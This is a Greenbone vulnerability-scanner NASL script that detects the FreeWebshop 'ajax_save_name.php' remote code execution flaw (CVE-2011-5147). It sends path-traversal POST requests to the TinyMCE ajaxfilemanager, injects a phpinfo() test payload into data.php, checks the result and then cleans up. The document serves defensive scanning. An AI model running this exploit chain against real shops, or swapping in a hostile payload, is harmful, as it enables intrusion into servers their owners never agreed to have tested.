# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:freewebshop:freewebshop";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103341");
  script_cve_id("CVE-2011-5147", "CVE-2009-2338");
  script_version("2025-01-17T15:39:18+0000");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("FreeWebshop 'ajax_save_name.php' RCE Vulnerability");
  script_tag(name:"last_modification", value:"2025-01-17 15:39:18 +0000 (Fri, 17 Jan 2025)");
  script_tag(name:"creation_date", value:"2011-11-17 08:34:17 +0100 (Thu, 17 Nov 2011)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("FreeWebShop_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("FreeWebshop/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50694");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34538");

  script_tag(name:"summary", value:"FreeWebshop is prone to a remote code execution (RCE) vulnerability because the
  application fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting this issue will allow attackers to execute arbitrary code within
  the context of the affected application.");

  script_tag(name:"affected", value:"FreeWebshop 2.2.9 R2 is vulnerable, prior versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
  a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

function random_mkdir(dir, port, host) {

  local_var dir, port, host;
  local_var vtstrings, dirname, payload, req, res;

  vtstrings = get_vt_strings();
  dirname = vtstrings["lowercase_rand"];

  payload = "new_folder=" + dirname + "&currentFolderPath=../../../up/";

  req = "POST " + dir + "/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.1\r\n" +
        "Host: " + host + "\r\n" +
        "Content-Length: " + strlen(payload) + "\r\n" +
        "Content-Type: application/x-www-form-urlencoded\r\n" +
        "\r\n" +
        payload;
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(!res || res !~ "^HTTP/1\.[01] 200" || dirname >!< res)
    exit(0);

  return dirname;
}

function exploit(ex, dir, port, host) {

  local_var ex, dir, port, host;
  local_var payload, req, res, session_id, sess, newname, url;

  payload = "selectedDoc[]=" + ex + "&currentFolderPath=../../../up/";

  req = string("POST ", dir, "/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_file_cut.php HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Length: ", strlen(payload), "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "\r\n",
               payload);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if(!res || res !~ "^HTTP/1\.[01] 200")
    exit(0);

  session_id = eregmatch(pattern:"Set-Cookie: ([^;]*);", string:res);
  if(isnull(session_id[1]))
    exit(0);

  sess = session_id[1];

  dirname = random_mkdir(dir:dir, port:port, host:host);
  newname = rand();
  payload = "value=" + newname + "&id=../../../up/" + dirname;

  req = string("POST ", dir, "/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_save_name.php HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Cookie: ", sess, "\r\n",
               "Content-Length: ", strlen(payload), "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "\r\n",
               payload);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if(!res || "path" >!< res || newname >!< res)
    exit(0);

  url = string(dir, "/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/inc/data.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if(!res)
    exit(0);

  return res;
}

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

host = http_host_name(port:port);

buf = exploit(ex:"<?php phpinfo(); die; ?>", dir:dir, port:port, host:host);

if("<title>phpinfo()" >< buf) {
  security_message(port:port);
  # nb: clean data.php but only after the security_message() above because the function exits on
  # some unexpected responses and we would miss to report a flaw in that case even if it had worked.
  exploit(ex:"", dir:dir, port:port, host:host);
  exit(0);
}

exit(99);
